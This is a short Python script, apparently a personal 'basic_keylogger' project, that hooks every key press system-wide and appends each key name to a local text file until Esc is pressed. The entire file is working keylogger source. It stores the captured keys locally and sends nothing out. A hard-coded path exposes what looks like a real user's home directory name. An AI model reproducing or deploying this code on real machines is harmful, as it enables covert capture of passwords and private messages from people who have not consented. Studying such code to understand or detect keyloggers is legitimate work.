import keyboard

log_file = "/Users/tirathlakhlani/PycharmProjects/basic_keylogger/keystrokes.txt"

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

keyboard.on_press(on_key_press)

keyboard.wait('esc')